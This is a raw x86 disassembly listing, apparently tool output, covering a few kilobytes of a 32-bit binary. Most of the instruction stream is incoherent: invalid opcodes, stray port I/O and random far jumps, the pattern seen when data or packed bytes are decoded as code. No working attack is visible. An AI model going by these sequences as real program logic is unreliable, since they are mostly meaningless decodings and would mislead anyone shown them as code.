  4142bf:	(bad)  
  4142c0:	xchg   esi,eax
  4142c1:	inc    ebx
  4142c2:	bound  eax,QWORD PTR [ebx-0x70]
  4142c5:	repnz sbb al,BYTE PTR [edi]
  4142c8:	mov    bh,BYTE PTR [eax+0x48b08d8]
  4142ce:	push   ebp
  4142cf:	and    eax,0x27d81176
  4142d4:	pop    ebx
  4142d5:	and    edx,DWORD PTR [ebp+0x44]
  4142d8:	mov    ebp,0xbf688401
  4142dd:	in     al,dx
  4142de:	repz ss out 0xfd,al
  4142e2:	pop    edx
  4142e3:	mov    bl,0xd8
  4142e5:	sahf   
  4142e6:	cli    
  4142e7:	(bad)  
  4142e8:	mov    ebp,0xb9c95b0
  4142ed:	test   DWORD PTR [ebp+0x2b],edx
  4142f0:	and    ebp,edx
  4142f2:	mov    edx,edi
  4142f4:	jb     0x414356
  4142f6:	mov    dh,0xea
  4142f8:	shr    DWORD PTR [eax+0x76b41855],cl
  4142fe:	jle    0x4142be
  414300:	sub    al,0x5c
  414302:	sbb    dl,BYTE PTR [esi-0x761d6d6e]
  414308:	repz retf 
  41430a:	scas   al,BYTE PTR es:[edi]
  41430b:	call   0x6079:0xbd0a359c
  414312:	repnz add BYTE PTR [edi-0x64],0x46
  414317:	xchg   edx,eax
  414318:	(bad)  
  414319:	lock push ds
  41431b:	pop    ebx
  41431c:	scas   al,BYTE PTR es:[edi]
  41431d:	mov    edx,0xc75f7d67
  414322:	inc    eax
  414323:	jno    0x4142e0
  414325:	test   DWORD PTR [eax],eax
  414327:	push   ecx
  414328:	loop   0x41437c
  41432a:	cmp    esp,DWORD PTR [bp+di]
  41432d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41432e:	cld    
  41432f:	cmp    DWORD PTR es:[esi+0x15],ebp
  414333:	inc    ebp
  414334:	jg     0x414388
  414336:	loope  0x4143a0
  414338:	jp     0x414366
  41433a:	cmp    esi,eax
  41433c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41433d:	dec    ebp
  41433e:	or     esi,DWORD PTR [eax]
  414340:	and    al,0x35
  414342:	aas    
  414343:	or     al,0xc0
  414345:	cmp    DWORD PTR [ecx],edi
  414347:	adc    DWORD PTR [ecx],edi
  414349:	aad    0x12
  41434b:	ret    0x7c6e
  41434e:	mov    al,0xca
  414350:	icebp  
  414351:	adc    DWORD PTR [edx+edi*4+0x29bd9d26],edx
  414358:	sub    eax,0x284a833
  41435d:	sub    BYTE PTR [edx-0x3e],ch
  414360:	adc    DWORD PTR [eax],eax
  414362:	stos   BYTE PTR es:[edi],al
  414363:	push   ebp
  414364:	call   0x7c0c:0xc9489802
  41436b:	push   edi
  41436c:	sub    DWORD PTR [esi+0x29c5b83d],0xd6ed739a
  414376:	add    al,0x95
  414378:	int3   
  414379:	(bad)  
  41437a:	in     al,dx
  41437b:	xor    bh,ah
  41437d:	push   ss
  41437e:	iret   
  41437f:	add    esi,DWORD PTR [edi+eax*4+0x65]
  414383:	lea    esp,[ebx+eax*2]
  414386:	aad    0x51
  414388:	loop   0x41438f
  41438a:	stc    
  41438b:	xchg   ebp,eax
  41438c:	rcr    BYTE PTR [edi-0x5cfd843f],0x21
  414393:	xchg   esp,eax
  414394:	lea    edi,[edx]
  414396:	cwde   
  414397:	(bad)  
  414398:	xchg   esi,eax
  414399:	loop   0x41432e
  41439b:	inc    esi
  41439c:	jp     0x414393
  41439e:	add    bl,dl
  4143a0:	lods   eax,DWORD PTR ds:[esi]
  4143a1:	cwde   
  4143a2:	mov    al,ds:0x7fd2a93b
  4143a7:	cmp    DWORD PTR [ebp-0x4c35c3b2],0x12bda702
  4143b1:	push   0x2d013c69
  4143b6:	add    dh,BYTE PTR [edi-0x3]
  4143b9:	pop    ds
  4143ba:	dec    esi
  4143bb:	jne    0x4143d4
  4143bd:	sbb    dl,BYTE PTR [esi+0x2c]
  4143c0:	popf   
  4143c1:	sub    DWORD PTR [esi-0x75],ebx
  4143c4:	rol    BYTE PTR [edi],0x9d
  4143c7:	push   0xfffffff5
  4143c9:	mov    al,ds:0xd609e039
  4143ce:	inc    eax
  4143cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d0:	add    eax,0xbfc3e179
  4143d5:	sbb    ebp,0x6cb86ff0
  4143db:	mov    BYTE PTR [ecx+edi*1-0x1f4e4898],dl
  4143e2:	dec    esp
  4143e3:	push   es
  4143e4:	cmp    BYTE PTR [ebx],0x4a
  4143e7:	ficomp DWORD PTR [edx-0x30a9df07]
  4143ed:	adc    BYTE PTR [esi],0xf
  4143f0:	mov    ds:0x4d86ed04,eax
  4143f5:	ins    DWORD PTR es:[edi],dx
  4143f6:	xor    eax,0x210cfa42
  4143fb:	xor    al,0x57
  4143fd:	adc    al,0x71
  4143ff:	aas    
  414400:	xchg   esi,eax
  414401:	fcomp  DWORD PTR [edx+0xc]
  414404:	imul   DWORD PTR [eax]
  414406:	fs xchg ebx,eax
  414408:	and    bh,BYTE PTR [eax+0x18f5f35a]
  41440e:	rol    DWORD PTR [edx-0x55b74904],1
  414414:	(bad)  
  414415:	fwait
  414416:	push   ecx
  414417:	fild   DWORD PTR [ecx-0x26d585e5]
  41441d:	pop    edx
  41441e:	js     0x414444
  414420:	in     al,dx
  414421:	and    eax,0x59fd977c
  414426:	push   edi
  414427:	fidivr DWORD PTR [esi+esi*4+0x5fe5fdc7]
  41442e:	xchg   ebx,eax
  41442f:	ffree  st(3)
  414431:	fadd   DWORD PTR [ebp+eax*8-0x520148d3]
  414438:	jne    0x4144b2
  41443a:	les    edi,FWORD PTR [edx+esi*8+0x6a822770]
  414441:	cmp    ebp,DWORD PTR [edi-0x49]
  414444:	call   0xac0c:0x2bc6a0ee
  41444b:	cmp    al,0xfd
  41444d:	cmp    edx,DWORD PTR [ebp+ebx*1+0x1f]
  414451:	lds    ebp,FWORD PTR [ebx+0x40]
  414454:	retf   0x3ad7
  414457:	xchg   ebx,eax
  414458:	xchg   cl,ch
  41445a:	out    dx,al
  41445b:	popf   
  41445c:	mov    BYTE PTR [edx],dl
  41445e:	(bad)  
  41445f:	adc    esp,ecx
  414461:	(bad)  
  414463:	pushf  
  414464:	xchg   ebp,eax
  414465:	popa   
  414466:	aad    0x67
  414468:	add    dh,BYTE PTR [ecx-0x6e]
  41446b:	sbb    DWORD PTR [ebx+0x7c],esi
  41446e:	dec    ebp
  41446f:	jle    0x4144db
  414471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414472:	inc    esp
  414473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414474:	jle    0x414452
  414476:	pop    DWORD PTR ss:[edx-0x25]
  41447a:	out    0x6e,eax
  41447c:	dec    eax
  41447d:	hlt    
  41447e:	mov    ebp,0x49bc891
  414483:	xor    edi,DWORD PTR [eax]
  414485:	outs   dx,BYTE PTR ds:[esi]
  414486:	in     eax,0x4c
  414488:	stos   BYTE PTR es:[edi],al
  414489:	or     edx,DWORD PTR [eax+0x42]
  41448c:	and    eax,0x52d253f2
  414491:	ja     0x41443c
  414493:	sbb    eax,0x864b6126
  414499:	in     al,0xa5
  41449b:	sti    
  41449c:	and    DWORD PTR [edx-0x1cdc1c30],ebp
  4144a2:	jne    0x4144d5
  4144a4:	mov    ?,WORD PTR [edx-0x76]
  4144a7:	and    bh,BYTE PTR [esi-0x729ff928]
  4144ad:	push   ecx
  4144ae:	shl    DWORD PTR [ecx+0x32],1
  4144b1:	jmp    0xbbe7f5d3
  4144b6:	into   
  4144b7:	test   BYTE PTR [eax+0x36],bl
  4144ba:	hlt    
  4144bb:	cli    
  4144bc:	inc    esi
  4144bd:	xchg   esp,eax
  4144be:	adc    al,0x85
  4144c0:	add    DWORD PTR [ebp+0x21],0xffffff93
  4144c4:	ss pop ecx
  4144c6:	sbb    DWORD PTR [ebx],esp
  4144c8:	in     al,0xba
  4144ca:	rol    BYTE PTR [eax-0x1388360d],0x1a
  4144d1:	xor    ch,BYTE PTR [esp+edi*2+0x2c]
  4144d5:	aad    0xa8
  4144d7:	lea    ebp,[edi-0x5eb2f664]
  4144dd:	outs   dx,BYTE PTR ds:[esi]
  4144de:	call   0x26ae:0xbfd0f66e
  4144e5:	sub    dh,ah
  4144e7:	inc    esi
  4144e8:	pop    edi
  4144e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ea:	or     DWORD PTR [ebp-0x1],0xffffffd1
  4144ee:	nop
  4144ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144f0:	(bad)  
  4144f1:	inc    edi
  4144f2:	fs mov ss,edi
  4144f5:	mov    eax,ds:0xc7f2075f
  4144fa:	test   al,0x18
  4144fc:	aad    0x2
  4144fe:	mov    esp,0x248b13e0
  414503:	call   0x32699454
  414508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414509:	aas    
  41450a:	sbb    bl,dh
  41450c:	cmp    al,BYTE PTR [eax+0x6d]
  41450f:	std    
  414510:	retf   
  414511:	icebp  
  414512:	xor    bh,ah
  414514:	jno    0x4144d3
  414516:	jns    0x41452e
  414518:	scas   eax,DWORD PTR es:[edi]
  414519:	push   es
  41451a:	call   0x2485:0x1cedbe92
  414521:	(bad)  
  414522:	repz mov esi,0x6bd38c6d
  414528:	bound  edx,QWORD PTR [edx+0x23]
  41452b:	sub    al,0x36
  41452d:	je     0x414551
  41452f:	test   al,0x2a
  414531:	fisttp QWORD PTR [edx]
  414533:	popf   
  414534:	jne    0x4145ab
  414536:	pop    ebx
  414537:	js     0x414543
  414539:	sbb    bh,dl
  41453b:	inc    ecx
  41453c:	or     DWORD PTR [esi],eax
  41453e:	aam    0xbe
  414540:	mov    dh,0x2d
  414542:	lds    esp,FWORD PTR [ebx+0xce70c59]
  414548:	call   0xeff1:0xe0f10baf
  41454f:	loop   0x41454f
  414551:	in     al,0xa2
  414553:	popf   
  414554:	inc    edi
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x74a2beb4
  414576:	xchg   edx,eax
  414577:	ror    ecx,cl
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414533
  414581:	xchg   esp,eax
  414582:	(bad)  
  414583:	pop    ebp
  414584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414586:	lock adc edx,ebp
  414589:	retf   
  41458a:	es mov ecx,0xd4a1fa9f
  414590:	sar    BYTE PTR [ebp-0x2edf1600],cl
  414596:	and    eax,0xedd34610
  41459b:	pop    ds
  41459c:	jle    0x4145ff
  41459e:	jns    0x4145f6
  4145a0:	push   edx
  4145a1:	(bad)  
  4145a4:	pop    edx
  4145a5:	sti    
  4145a6:	(bad)  
  4145a7:	sti    
  4145a8:	dec    ecx
  4145a9:	push   ecx
  4145aa:	and    eax,0xe6329453
  4145af:	adc    edx,DWORD PTR [esi-0x3938ca7c]
  4145b5:	jmp    0x4145cd
  4145b7:	sub    esp,DWORD PTR [ebx-0x7492d861]
  4145bd:	inc    ebx
  4145be:	test   DWORD PTR [ebp+0x55],edx
  4145c1:	loop   0x414548
  4145c3:	jmpw   0xb1fc
  4145c7:	jecxz  0x41455a
  4145c9:	mov    DWORD PTR [ebp+edi*8+0x773f6f5a],ecx
  4145d0:	add    ch,0x47
  4145d3:	int3   
  4145d4:	ss xor al,0x4d
  4145d7:	mov    ebx,DWORD PTR [ebx-0x2d]
  4145da:	addr16 xchg edi,eax
  4145dc:	out    dx,al
  4145dd:	xor    bh,al
  4145df:	popa   
  4145e0:	cwde   
  4145e1:	mov    ds:0x1f269466,al
  4145e6:	sub    dl,al
  4145e8:	or     edi,edi
  4145ea:	nop
  4145eb:	dec    eax
  4145ec:	xchg   BYTE PTR [ecx+0x32527dc9],dl
  4145f2:	es ja  0x41461a
  4145f5:	mov    fs,WORD PTR [esi+0x3b]
  4145f8:	ins    BYTE PTR es:[edi],dx
  4145f9:	int3   
  4145fa:	fdiv   st,st(1)
  4145fc:	enter  0x8b64,0xea
  414600:	hlt    
  414601:	jmp    0x41467c
  414603:	sub    eax,0x5ff0b0bf
  414608:	sub    ch,BYTE PTR [esi-0x1a331bf9]
  41460e:	popf   
  41460f:	push   esp
  414610:	or     DWORD PTR [edx-0x5a4716d8],edi
  414616:	mov    ds:0x968f561e,eax
  41461b:	repz pop ds
  41461d:	out    0x1f,eax
  41461f:	sbb    eax,0x24d3daa0
  414624:	nop
  414625:	rcl    BYTE PTR [ecx+0x3c],1
  414628:	mov    ds:0xe90bd3ab,al
  41462d:	cld    
  41462e:	mov    eax,0x66ce70db
  414633:	xchg   edi,eax
  414634:	in     al,0x11
  414636:	push   edi
  414637:	lods   al,BYTE PTR ds:[esi]
  414638:	pop    eax
  414639:	out    dx,eax
  41463a:	lahf   
  41463b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41463c:	fisttp DWORD PTR [eax]
  41463e:	xchg   ebx,eax
  41463f:	push   edi
  414640:	add    al,0x5
  414642:	sbb    dl,BYTE PTR gs:[ebp+0x5d]
  414646:	inc    esp
  414647:	call   0x9abb1eaf
  41464c:	inc    esp
  41464d:	sbb    eax,0xd45f0e2c
  414652:	xchg   ebx,eax
  414653:	dec    esp
  414654:	(bad)  
  414655:	cli    
  414656:	stos   BYTE PTR es:[edi],al
  414657:	pop    ebp
  414658:	jo     0x4146d9
  41465a:	inc    ebx
  41465b:	pop    esi
  41465c:	imul   eax,edx,0xb11764bd
  414662:	sbb    BYTE PTR [ecx],ch
  414664:	retf   0xcaf9
  414667:	ins    DWORD PTR es:[edi],dx
  414668:	mul    DWORD PTR [edx-0x3f]
  41466b:	sbb    ebx,DWORD PTR [edi+ebp*2]
  41466e:	mov    eax,ds:0xf83ecdca
  414673:	pop    ecx
  414674:	cmp    eax,DWORD PTR [eax]
  414676:	cs jns 0x4146b7
  414679:	mov    bl,0x38
  41467b:	pop    edx
  41467c:	mov    al,ds:0x593707f9
  414681:	xor    edi,ecx
  414683:	xchg   ecx,eax
  414684:	icebp  
  414685:	xchg   DWORD PTR [edi-0x7bb7ed6c],edi
  41468b:	arpl   WORD PTR [ecx-0x40],ax
  41468e:	hlt    
  41468f:	shr    DWORD PTR [esi],0xe2
  414692:	enter  0xfb9b,0x43
  414696:	jne    0x41462a
  414698:	fisubr WORD PTR [ecx-0x20]
  41469b:	es lahf 
  41469d:	jnp    0x41461f
  41469f:	pop    ebp
  4146a0:	pop    ss
  4146a1:	adc    DWORD PTR [esi+0x7d7fdabf],edi
  4146a7:	push   0x48743525
  4146ac:	jb     0x414636
  4146ae:	jmp    0x3f2b3bbd
  4146b3:	mov    WORD PTR [ebp+0xf],es
  4146b6:	(bad)  
  4146b7:	mov    cs,ecx
  4146b9:	or     DWORD PTR [eax],eax
  4146bb:	jle    0x414671
  4146bd:	push   0x34
  4146bf:	cmp    DWORD PTR [ebx+0x20],0xffffff9c
  4146c3:	shl    DWORD PTR [edx],1
  4146c5:	retf   
  4146c6:	mov    edx,0x9872e3a6
  4146cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146cc:	repnz add bl,BYTE PTR [edx]
  4146cf:	dec    esi
  4146d0:	xchg   ecx,eax
  4146d1:	test   ch,0x41
  4146d4:	add    BYTE PTR [esi],ah
  4146d6:	jae    0x414704
  4146d8:	rol    dh,0x4f
  4146db:	and    BYTE PTR [ebx],0xa1
  4146de:	loopne 0x414739
  4146e0:	push   ebx
  4146e1:	cli    
  4146e2:	pushf  
  4146e3:	scas   al,BYTE PTR es:[edi]
  4146e4:	jl     0x4146e2
  4146e6:	xlat   BYTE PTR ds:[ebx]
  4146e7:	push   esp
  4146e8:	imul   ebx,DWORD PTR [ecx+0x2430dbf6],0xfffffff4
  4146ef:	mov    bh,0x7e
  4146f1:	enter  0xa03d,0x1b
  4146f5:	dec    esi
  4146f6:	in     al,dx
  4146f7:	fdivr  QWORD PTR [eax+0x2bb00e8c]
  4146fd:	push   cs
  4146fe:	and    BYTE PTR [ebx],0x20
  414701:	pop    eax
  414702:	push   edx
  414703:	arpl   WORD PTR [ebx+0x36],bx
  414706:	jmp    0x2c97b4dd
  41470b:	mov    cl,0x1f
  41470d:	sbb    eax,0x158dcecf
  414712:	clc    
  414713:	jle    0x4146d4
  414715:	push   ds
  414716:	xchg   DWORD PTR [esi+ebp*8-0x18],ebp
  41471a:	aad    0x62
  41471c:	push   0xdbbef198
  414721:	sbb    eax,0x2e796f41
  414726:	mov    esi,0x14c2a108
  41472b:	xchg   BYTE PTR [edi+eax*8+0x5eca578b],dh
  414732:	or     al,0xb5
  414734:	jp     0x414765
  414736:	ja     0x4146fc
  414738:	cmp    ah,ch
  41473a:	and    esi,DWORD PTR [edi+ebx*1]
  41473d:	(bad)  [edi-0x6f]
  414740:	mov    BYTE PTR [eax],cl
  414742:	lods   eax,DWORD PTR ds:[esi]
  414743:	adc    edx,DWORD PTR [edi]
  414745:	mov    WORD PTR [edi],?
  414747:	push   es
  414748:	imul   esp,DWORD PTR [ecx+0x4f8ff86a],0xaaa73874
  414752:	mov    dl,0x9b
  414754:	jmp    0x414723
  414756:	(bad)  
  414758:	adc    eax,eax
  41475a:	nop
  41475b:	adc    ch,BYTE PTR [esi+0x23]
  41475e:	adc    al,0x91
  414760:	cs loop 0x4146f3
  414763:	xchg   dh,dh
  414765:	ret    
  414766:	hlt    
  414767:	adc    DWORD PTR fs:[ebx],esp
  41476a:	arpl   sp,di
  41476c:	imul   edi,DWORD PTR [edx-0x5e44566d],0xa114f42f
  414776:	or     eax,0x3b6b886c
  41477b:	sbb    eax,0x6c204d3f
  414780:	pop    ss
  414781:	add    eax,0xdbe78017
  414786:	pusha  
  414787:	repz out dx,al
  414789:	rol    BYTE PTR [ebx-0x5f9e74f5],cl
  41478f:	xlat   BYTE PTR ds:[ebx]
  414790:	dec    esp
  414791:	inc    esi
  414792:	lods   eax,DWORD PTR ds:[esi]
  414793:	and    eax,0x71e5c742
  414798:	mov    DWORD PTR [edx],eax
  41479a:	je     0x414816
  41479c:	out    dx,eax
  41479d:	aaa    
  41479e:	dec    edi
  41479f:	sub    BYTE PTR [ecx-0xcbfc3f7],dl
  4147a5:	fwait
  4147a6:	cli    
  4147a7:	out    dx,eax
  4147a8:	jb     0x41474e
  4147aa:	pop    es
  4147ab:	ss cmp al,0x45
  4147ae:	inc    edi
  4147af:	add    DWORD PTR [edi],ebp
  4147b1:	outs   dx,DWORD PTR ds:[esi]
  4147b2:	das    
  4147b3:	xor    BYTE PTR [edi+eiz*2-0x253559f7],ch
  4147ba:	add    BYTE PTR [ebp+0x2a],al
  4147bd:	out    0x2,al
  4147bf:	and    eax,0x6c838d00
  4147c4:	push   eax
  4147c5:	sub    al,BYTE PTR ds:0x2c74a0d3
  4147cb:	nop
  4147cc:	push   ebx
  4147cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147ce:	or     esi,esp
  4147d0:	push   esp
  4147d1:	cmp    ah,BYTE PTR [esi-0x3a]
  4147d4:	outs   dx,BYTE PTR ds:[esi]
  4147d5:	xor    al,0x75
  4147d7:	out    dx,eax
  4147d8:	push   ds
  4147d9:	out    0x2a,al
  4147db:	fdiv   DWORD PTR [eax-0x20903c3f]
  4147e1:	fucomp st(0)
  4147e3:	data16 xor ah,BYTE PTR [eax-0x78]
  4147e7:	or     al,0xee
  4147e9:	lods   al,BYTE PTR ds:[esi]
  4147ea:	jecxz  0x414841
  4147ec:	jnp    0x41484d
  4147ee:	into   
  4147ef:	into   
  4147f0:	xchg   ebx,eax
  4147f1:	xchg   DWORD PTR [eax+0x91cdb96],edi
  4147f7:	sbb    eax,0xbe6b8c5b
  4147fc:	sbb    edx,DWORD PTR [esi-0x6f]
  4147ff:	mov    ch,0xa0
  414801:	out    dx,eax
  414802:	lods   al,BYTE PTR ds:[esi]
  414803:	test   al,0x52
  414805:	xor    al,BYTE PTR [edx-0x64]
  414808:	sbb    edi,esp
  41480a:	cmp    eax,0x1ca8d948
  41480f:	or     al,0x33
  414811:	pop    ebp
  414812:	into   
  414813:	data16 js 0x414813
  414816:	push   ss
  414817:	loopne 0x414806
  414819:	cdq    
  41481a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41481b:	cmp    esi,edi
  41481d:	xchg   ecx,eax
  41481e:	adc    eax,0x177bf09
  414823:	pop    ss
  414824:	mov    ebx,0xf49e864b
  414829:	out    0xf4,al
  41482b:	xchg   edx,eax
  41482c:	jecxz  0x414893
  41482e:	adc    ebp,DWORD PTR [edi+0xd39d7ff]
  414834:	xor    al,0x1d
  414836:	pop    ds
  414837:	call   0x6fd4a9f9
  41483c:	mov    cl,0x10
  41483f:	icebp  
  414840:	add    eax,0xf13079ba
  414845:	mov    edi,0xf84d8b2d
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414804
  414861:	adc    ah,ch
  414863:	loop   0x414877
  414865:	jge    0x4148e6
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148e1
  41486d:	pushf  
  41486e:	retf   0x3a47
  414871:	xchg   ebx,eax
  414872:	pop    ebp
  414873:	popf   
  414874:	test   al,0x2b
  414876:	pop    edi
  414877:	xor    bh,ah
  414879:	jo     0x4147fe
  41487b:	or     bh,bl
  41487d:	jmp    0x414801
  41487f:	in     eax,dx
  414880:	xchg   esp,eax
  414881:	ja     0x414889
  414883:	inc    ebp
  414884:	loope  0x41484a
  414886:	addr16 and eax,0x3ff20d4b
  41488c:	dec    ebx
  41488d:	sar    DWORD PTR [ebp+esi*8-0x220e495c],0x48
  414895:	xchg   edx,eax
  414896:	mov    esp,0x3a7e4a9c
  41489b:	add    ebx,DWORD PTR [ebp+0x24a3d14a]
  4148a1:	ins    DWORD PTR es:[edi],dx
  4148a2:	xor    ecx,DWORD PTR [ecx]
  4148a4:	mov    al,0x29
  4148a6:	add    ch,BYTE PTR [eax]
  4148a8:	cmp    BYTE PTR [edi],dh
  4148aa:	push   edx
  4148ab:	retf   0xeee8
  4148ae:	push   esi
  4148af:	cmp    esi,DWORD PTR [esp]
  4148b2:	inc    edx
  4148b3:	xlat   BYTE PTR ds:[ebx]
  4148b4:	sbb    edx,ebx
  4148b6:	dec    eax
  4148b7:	cmc    
  4148b8:	jbe    0x414917
  4148ba:	scas   eax,DWORD PTR es:[edi]
  4148bb:	sti    
  4148bc:	add    dl,al
  4148be:	test   al,0xd
  4148c0:	mov    ebx,0x5867b05a
  4148c5:	lods   eax,DWORD PTR ds:[si]
  4148c7:	out    dx,al
  4148c8:	pushf  
  4148c9:	mov    ecx,0x929014ff
  4148ce:	int3   
  4148cf:	and    DWORD PTR [ecx],ebp
  4148d1:	aaa    
  4148d2:	inc    edi
  4148d3:	mov    eax,ds:0xc1efe6ad
  4148d8:	std    
  4148d9:	test   BYTE PTR [esi+ebp*2],al
  4148dc:	loopne 0x414900
  4148de:	sub    al,0x63
  4148e0:	imul   edi,ebx,0x17
  4148e3:	xor    bh,BYTE PTR ds:0x42885d0e
  4148e9:	sub    dl,BYTE PTR [esi+0x2910d078]
  4148ef:	adc    DWORD PTR [ecx+0x3e],ebp
  4148f2:	nop
  4148f3:	inc    ebx
  4148f4:	mov    edx,ebp
  4148f6:	repnz sub ch,BYTE PTR [ebx+0xaf6a412]
  4148fd:	rcr    BYTE PTR [eax],1
  4148ff:	daa    
  414900:	jbe    0x4148ab
  414902:	and    DWORD PTR [ebx+0x26],edx
  414905:	cmc    
  414906:	push   ebp
  414907:	mov    esp,0x9531f097
  41490c:	jae    0x414901
  41490e:	into   
  41490f:	(bad)  
  414910:	dec    esi
  414911:	adc    eax,0x9fbc0273
  414916:	fdiv   DWORD PTR [ebx-0x7b]
  414919:	repz mov ebp,0xcdefea2f
  41491f:	or     DWORD PTR [edi-0x3f],ebp
  414922:	cmc    
  414923:	in     al,dx
  414924:	mov    cl,BYTE PTR [edi]
  414926:	gs cmp al,0xc7
  414929:	imul   edi,DWORD PTR [edx-0x7ce54dcf],0xffffffea
  414930:	pusha  
  414931:	mov    ah,0xc6
  414933:	mov    ebx,DWORD PTR [ebx-0x1c]
  414936:	lods   al,BYTE PTR ds:[esi]
  414937:	xchg   edi,eax
  414938:	les    edx,FWORD PTR [eax]
  41493a:	sbb    DWORD PTR ds:0x32798060,edx
  414940:	dec    edi
  414941:	bound  edx,QWORD PTR [esi-0x46137128]
  414947:	cmp    esi,DWORD PTR [edx-0x20]
  41494a:	jl     0x41496b
  41494c:	fsub   QWORD PTR [eax-0x6b]
  41494f:	test   BYTE PTR [edi+0x3964c063],dh
  414955:	stos   WORD PTR es:[edi],ax
  414957:	or     al,0xf4
  414959:	jns    0x414996
  41495b:	fcomip st,st(2)
  41495d:	xchg   edi,eax
  41495e:	and    al,0x0
  414960:	int3   
  414961:	push   edx
  414962:	xchg   esp,eax
  414963:	cmp    al,0x57
  414965:	add    bh,BYTE PTR [ebp+0x44ce6c39]
  41496b:	loop   0x414915
  41496d:	jbe    0x41491a
  41496f:	sbb    DWORD PTR [ebp+0x3],esp
  414972:	outs   dx,DWORD PTR ds:[esi]
  414973:	and    BYTE PTR [eax-0x5e],bl
  414976:	or     al,dl
  414978:	lea    eax,[ecx]
  41497a:	out    0xe4,eax
  41497c:	rcr    BYTE PTR [edi+esi*2],1
  41497f:	pop    ecx
  414980:	test   BYTE PTR [edi],0x9f
  414983:	(bad)  
  414984:	pop    eax
  414985:	sti    
  414986:	imul   edx,DWORD PTR [edx+0x2f],0x1e
  41498a:	sbb    BYTE PTR [edx-0x4330d34e],cl
  414990:	mov    dl,0xae
  414992:	mov    bl,0xc5
  414994:	push   ebx
  414995:	adc    BYTE PTR [edx+0xe],bl
  414998:	mov    eax,ds:0x4e544d81
  41499d:	lahf   
  41499e:	mov    ecx,0x79d9ee0
  4149a3:	adc    cl,0xe3
  4149a6:	xor    BYTE PTR [ebp+0x30],ah
  4149a9:	cli    
  4149aa:	jnp    0x414a25
  4149ac:	pop    es
  4149ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ae:	sbb    al,ch
  4149b0:	neg    BYTE PTR [esi-0x63]
  4149b3:	jb     0x41495d
  4149b5:	jne    0x4149fc
  4149b7:	xor    eax,0x36025106
  4149bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149bd:	call   0xd107fadf
  4149c2:	xor    al,0x1d
  4149c4:	sub    eax,DWORD PTR [ebp+edx*4-0x683d0bd5]
  4149cb:	cmp    eax,0xbed3ba4d
  4149d0:	adc    al,0xd2
  4149d2:	pop    eax
  4149d3:	jp     0x4149b2
  4149d5:	fwait
  4149d6:	mov    ds:0x257cec9d,eax
  4149db:	push   esi
  4149dc:	mov    al,0x8c
  4149de:	mov    al,ds:0x86ba0319
  4149e3:	(bad)  
  4149e4:	cld    
  4149e5:	in     eax,dx
  4149e6:	mov    eax,ds:0x71af729f
  4149eb:	fucomp st(7)
  4149ed:	popa   
  4149ee:	pop    ds
  4149ef:	or     DWORD PTR [eax-0x6cce365d],ebx
  4149f5:	outs   dx,BYTE PTR ds:[esi]
  4149f6:	xchg   esi,eax
  4149f7:	add    eax,0xaaa7f27c
  4149fc:	sbb    eax,0xed3ac26d
  414a01:	nop
  414a02:	mov    gs,WORD PTR [eax+0x1]
  414a05:	test   al,0xd7
  414a07:	into   
  414a08:	mov    bl,0x92
  414a0a:	jmp    0x414a02
  414a0c:	arpl   WORD PTR [eax-0x274ebd4d],cx
  414a12:	or     DWORD PTR [esi+0x61d55a88],eax
  414a18:	(bad)  
  414a19:	into   
  414a1a:	mov    ecx,0x8f328cc9
  414a1f:	mov    ebp,0x5dc42c31
  414a24:	adc    esp,esp
  414a26:	push   ds
  414a27:	jp     0x414a86
  414a29:	stos   DWORD PTR es:[edi],eax
  414a2a:	lock jo 0x4149c6
  414a2d:	inc    edi
  414a2e:	(bad)  
  414a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a31:	sub    eax,0xbfe5ca22
  414a36:	mov    dl,0xa7
  414a38:	lds    esi,FWORD PTR [ecx]
  414a3a:	popa   
  414a3b:	xchg   ebp,eax
  414a3c:	sbb    ch,0xac
  414a3f:	inc    edx
  414a40:	and    DWORD PTR [edi],esp
  414a42:	xchg   ecx,eax
  414a43:	mov    ds:0xdf1cc299,al
  414a48:	push   ss
  414a49:	imul   edi,DWORD PTR [eax-0x5eacc44c],0x41
  414a50:	inc    esp
  414a51:	push   esi
  414a52:	inc    eax
  414a53:	(bad)  
  414a54:	rcl    DWORD PTR [edi-0x35],0xa4
  414a58:	cs sbb al,0x82
  414a5b:	out    dx,eax
  414a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a5d:	rcr    DWORD PTR [ebx+0x6cfcce66],cl
  414a63:	xchg   esi,eax
  414a64:	pop    ss
  414a65:	mov    esi,0x885ca46d
  414a6a:	pop    esi
  414a6b:	es jne 0x414ad9
  414a6e:	ret    0x7cba
  414a71:	aas    
  414a72:	xchg   ebp,eax
  414a73:	push   esp
  414a74:	cs pusha 
  414a76:	stc    
  414a77:	clc    
  414a78:	xor    dh,BYTE PTR [esp+ecx*4+0x1e748107]
  414a7f:	and    eax,0xd60c559
  414a84:	call   0xaa37:0x88cd2562
